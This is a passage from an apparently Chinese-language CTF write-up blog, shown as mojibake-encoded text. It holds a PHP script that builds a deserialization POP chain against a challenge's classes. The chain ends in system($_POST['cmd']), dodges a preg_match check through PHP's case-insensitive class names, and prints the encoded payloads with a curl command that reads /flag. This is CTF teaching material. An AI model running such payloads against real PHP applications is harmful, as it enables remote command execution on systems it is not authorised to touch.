</span></span></span><span class="line"><span class="cl"><span class="sd"> * è¿™ä¸ªè„šæœ¬ç”¨äºç”Ÿæˆæœ¬é¢˜çš„ POP chainï¼ˆPHP åºåˆ—åŒ– payloadï¼‰ã€‚
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * ä½¿ç”¨æ–¹æ³•ï¼š
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  1. åœ¨æœ¬åœ°ä¿å­˜ä¸º pop_chain_generator.php
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  2. è¿è¡Œï¼š php pop_chain_generator.php
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  3. ç¨‹åºä¼šè¾“å‡ºä¸‰ç§æ ¼å¼ï¼š
</span></span></span><span class="line"><span class="cl"><span class="sd"> *     - åŸå§‹åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆç›´æ¥åœ¨ç›®æ ‡é¡µé¢çš„ payload å‚æ•°ä½¿ç”¨ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="sd"> *     - URL encodedï¼ˆå¯ç›´æ¥æ”¾å…¥ curl çš„ --data-urlencodeï¼‰
</span></span></span><span class="line"><span class="cl"><span class="sd"> *     - Base64 ç¼–ç ï¼ˆä¸€äº›é¢˜ç›®æŠŠ payload æ”¾åˆ° header æˆ– cookie æ—¶æ›´æ–¹ä¾¿ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * åˆ©ç”¨æ€è·¯ï¼ˆè¯¦å°½æ³¨é‡Šï¼‰ï¼š
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  1) è§¦å‘ç‚¹ï¼šç›®æ ‡è„šæœ¬åœ¨æœ€åæ‰§è¡Œ unserialize($_POST[&#39;payload&#39;]);
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  2) H::__destruct() åœ¨å¯¹è±¡é”€æ¯æ—¶è°ƒç”¨ $this-&gt;who-&gt;start();
</span></span></span><span class="line"><span class="cl"><span class="sd"> *     - å› æ­¤æˆ‘ä»¬å¸Œæœ›è®© H-&gt;who æŒ‡å‘ä¸€ä¸ª A çš„å®ä¾‹ï¼ŒA::start() ä¼š echo $this-&gt;next;
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  3) å¦‚æœ A-&gt;next æŒ‡å‘ V çš„å®ä¾‹ï¼ŒA::start() echo $this-&gt;next å°†è§¦å‘ V::__toString()ï¼ˆå› ä¸º echo å¯¹è±¡ä¼šè°ƒç”¨ __toStringï¼‰
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  4) V::__toString() çš„å®ç°é‡Œï¼š
</span></span></span><span class="line"><span class="cl"><span class="sd"> *       $abc = $this-&gt;dowhat;
</span></span></span><span class="line"><span class="cl"><span class="sd"> *       $this-&gt;go-&gt;$abc;
</span></span></span><span class="line"><span class="cl"><span class="sd"> *     - ä¹Ÿå°±æ˜¯è¯´ï¼šå¦‚æœæˆ‘ä»¬æŠŠ dowhat è®¾ç½®ä¸º &#34;secret&#34;ï¼Œå¹¶æŠŠ go è®¾ç½®ä¸º E çš„å®ä¾‹ï¼Œåˆ™ä¼šè§¦å‘ E::__get(&#39;secret&#39;)
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  5) E::__get() ä¸­ï¼Œå½“ $name===&#39;secret&#39; æ—¶ï¼Œä¼š echo æç¤ºå¹¶è°ƒç”¨ $this-&gt;found-&gt;check();
</span></span></span><span class="line"><span class="cl"><span class="sd"> *     - å› æ­¤æˆ‘ä»¬æŠŠ E-&gt;found è®¾ç½®ä¸º F çš„å®ä¾‹
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  6) F::check() çš„é€»è¾‘ï¼š
</span></span></span><span class="line"><span class="cl"><span class="sd"> *       if(preg_match(&#34;/U/&#34;, $this-&gt;finalstep)) { echo &#34;ä»”ç»†æƒ³æƒ³ï¼&#34;; }
</span></span></span><span class="line"><span class="cl"><span class="sd"> *       else { $this-&gt;step = new $this-&gt;finalstep(); ($this-&gt;step)(); }
</span></span></span><span class="line"><span class="cl"><span class="sd"> *     - å…³é”®ç‚¹ï¼špreg_match åŒ¹é…çš„æ˜¯å¤§å†™å­—æ¯ Uã€‚å¦‚æœæˆ‘ä»¬æŠŠ finalstep è®¾ä¸ºå°å†™ &#39;u&#39;ï¼Œpreg_match(&#34;/U/&#34;) ä¸åŒ¹é…ï¼Œ
</span></span></span><span class="line"><span class="cl"><span class="sd"> *       äºæ˜¯ä¼šæ‰§è¡Œ $this-&gt;step = new &#39;u&#39;(); åœ¨ PHP ä¸­ç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œnew &#39;u&#39;() ä¼šå®ä¾‹åŒ–ç±» Uã€‚
</span></span></span><span class="line"><span class="cl"><span class="sd"> *     - éšå ($this-&gt;step)(); ä¼šè§¦å‘ U::__invoke()
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  7) U::__construct() ä¼šæŠŠ $this-&gt;there = new N(); å¹¶æŠŠ $this-&gt;cmd = $_POST[&#39;cmd&#39;];
</span></span></span><span class="line"><span class="cl"><span class="sd"> *    U::__invoke() è¿”å› $this-&gt;there-&gt;system($this-&gt;cmd);
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  8) N::__call() çš„å®ç°ï¼š
</span></span></span><span class="line"><span class="cl"><span class="sd"> *       return call_user_func($func_name,$args[0]);
</span></span></span><span class="line"><span class="cl"><span class="sd"> *    - è¿™æ„å‘³ç€å½“é€šè¿‡ $this-&gt;there-&gt;system(...) è°ƒç”¨æ—¶ï¼ŒN::__call ä¼šè°ƒç”¨ call_user_func(&#39;system&#39;, $cmd)
</span></span></span><span class="line"><span class="cl"><span class="sd"> *    - æœ€ç»ˆè¾¾åˆ°æ‰§è¡Œ system($_POST[&#39;cmd&#39;]) çš„æ•ˆæœ
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * æ€»ç»“ï¼šæ„é€ ä¸€ä¸ª H -&gt; A -&gt; V -&gt; E -&gt; F çš„å¯¹è±¡é“¾å¹¶è®¾ç½®åˆé€‚å­—æ®µï¼Œ
</span></span></span><span class="line"><span class="cl"><span class="sd"> * åœ¨ååºåˆ—åŒ–é“¾è§¦å‘åä¼šæœ€ç»ˆæ‰§è¡Œ system($_POST[&#39;cmd&#39;])ã€‚
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * æ³¨æ„äº‹é¡¹ï¼š
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  - åœ¨æŸäº›ç»ƒä¹ /å¹³å°ä¸Šå¯èƒ½å¯ç”¨ unserialize çš„ allowed_classes ç™½åå•æˆ–ç¦ç”¨äº†æŸäº›ç±»ï¼Œè‹¥å‡ºç°è¿™ç§æƒ…å†µéœ€è¦å¦å¤–å¯»æ‰¾ gadgetã€‚
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  - è¿™ä¸ªè„šæœ¬åªæ˜¯æœ¬åœ°ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼›ä¸è¦æŠŠå®ƒç›´æ¥å‘åˆ°æœªç»æˆæƒçš„æœåŠ¡å™¨ä¸Šæµ‹è¯•ã€‚
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ä¸ºäº†æ–¹ä¾¿ç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°å®šä¹‰ä¸ç›®æ ‡ç›¸åŒçš„ç±»åï¼ˆä»…å£°æ˜å…¬æœ‰å±æ€§ï¼Œé¿å…è°ƒç”¨ä»»ä½•æ„é€ å‡½æ•°/æ–¹æ³•ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1">// è¿™äº›ç±»ä»…ç”¨äºæœ¬åœ°åºåˆ—åŒ–ï¼Œä¸ä¼šåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šè¿è¡Œæœ¬åœ°çš„æ„é€ å™¨é€»è¾‘ã€‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">H</span> <span class="p">{</span> <span class="k">public</span> <span class="nv">$who</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span> <span class="k">public</span> <span class="nv">$first</span><span class="p">;</span> <span class="k">public</span> <span class="nv">$step</span><span class="p">;</span> <span class="k">public</span> <span class="nv">$next</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">V</span> <span class="p">{</span> <span class="k">public</span> <span class="nv">$good</span><span class="p">;</span> <span class="k">public</span> <span class="nv">$keep</span><span class="p">;</span> <span class="k">public</span> <span class="nv">$dowhat</span><span class="p">;</span> <span class="k">public</span> <span class="nv">$go</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">E</span> <span class="p">{</span> <span class="k">public</span> <span class="nv">$you</span><span class="p">;</span> <span class="k">public</span> <span class="nv">$found</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">F</span> <span class="p">{</span> <span class="k">public</span> <span class="nv">$fifth</span><span class="p">;</span> <span class="k">public</span> <span class="nv">$step</span><span class="p">;</span> <span class="k">public</span> <span class="nv">$finalstep</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// æ„é€ å¯¹è±¡å›¾ï¼š H -&gt; A -&gt; V -&gt; E -&gt; F
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$h</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">H</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$v</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">V</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">E</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">F</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// è®¾ç½®å…³é”®å­—æ®µï¼Œä¸ä½ åœ¨ç›®æ ‡è„šæœ¬ä¸­è¦è§¦å‘çš„æ–¹æ³•å¯¹åº”
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">finalstep</span> <span class="o">=</span> <span class="s1">&#39;u&#39;</span><span class="p">;</span>          <span class="c1">// å°å†™ &#39;u&#39;ï¼Œé¿å¼€ preg_match(&#34;/U/&#34;)ï¼Œå®é™…ä¼šå®ä¾‹åŒ–ç±» U
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">found</span>     <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>           <span class="c1">// E-&gt;__get() ä¸­ä¼šè°ƒç”¨ $this-&gt;found-&gt;check()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$v</span><span class="o">-&gt;</span><span class="na">dowhat</span>    <span class="o">=</span> <span class="s1">&#39;secret&#39;</span><span class="p">;</span>     <span class="c1">// V::__toString() ä¼šè®¿é—® $this-&gt;go-&gt;secretï¼Œè§¦å‘ E::__get
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$v</span><span class="o">-&gt;</span><span class="na">go</span>        <span class="o">=</span> <span class="nv">$e</span><span class="p">;</span>           <span class="c1">// go æŒ‡å‘ E çš„å®ä¾‹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">next</span>      <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>           <span class="c1">// A::start() echo $this-&gt;next -&gt; è°ƒç”¨ V::__toString()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$h</span><span class="o">-&gt;</span><span class="na">who</span>       <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>           <span class="c1">// H-&gt;__destruct() è°ƒç”¨ $this-&gt;who-&gt;start()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// åºåˆ—åŒ–å¹¶è¾“å‡º
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$urlencoded</span> <span class="o">=</span> <span class="nx">rawurlencode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$base64</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;=== åŸå§‹åºåˆ—åŒ– payload ===</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$payload</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;=== URL encodedï¼ˆé€‚ç”¨äº curl --data-urlencodeï¼‰ ===</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$urlencoded</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;=== Base64 encodedï¼ˆå¯æ”¾ cookie/headerï¼‰ ===</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$base64</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ä¹Ÿæ‰“å°ç¤ºä¾‹ curl å‘½ä»¤ï¼ˆè¯·æ›¿æ¢ç›®æ ‡ URLï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$example_url</span> <span class="o">=</span> <span class="s1">&#39;http://target/path/to/challenge.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$curl</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;curl -s -X POST --data-urlencode </span><span class="se">\&#34;</span><span class="s2">payload=%s</span><span class="se">\&#34;</span><span class="s2"> --data-urlencode </span><span class="se">\&#34;</span><span class="s2">cmd=cat /flag</span><span class="se">\&#34;</span><span class="s2"> </span><span class="se">\&#34;</span><span class="s2">%s</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$payload</span><span class="p">,</span> <span class="nv">$example_url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;=== ç¤ºä¾‹ curl å‘½ä»¤ï¼ˆè¯·æ›¿æ¢ URLï¼‰ ===</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$curl</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/tgctf%E9%83%A8%E5%88%86wp/">
        
        

        <div class="article-details">
            <h2 class="article-title">TGCTFéƒ¨åˆ†WP</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E6%B7%98%E6%B1%B0%E8%B5%9B/">
        
        

        <div class="article-details">
            <h2 class="article-title">æ·˜æ±°èµ›</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2024 - 
        
        2025 Oight
    </section>
    
    <section class="powerby">
        
            Build by Oight <br/>
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
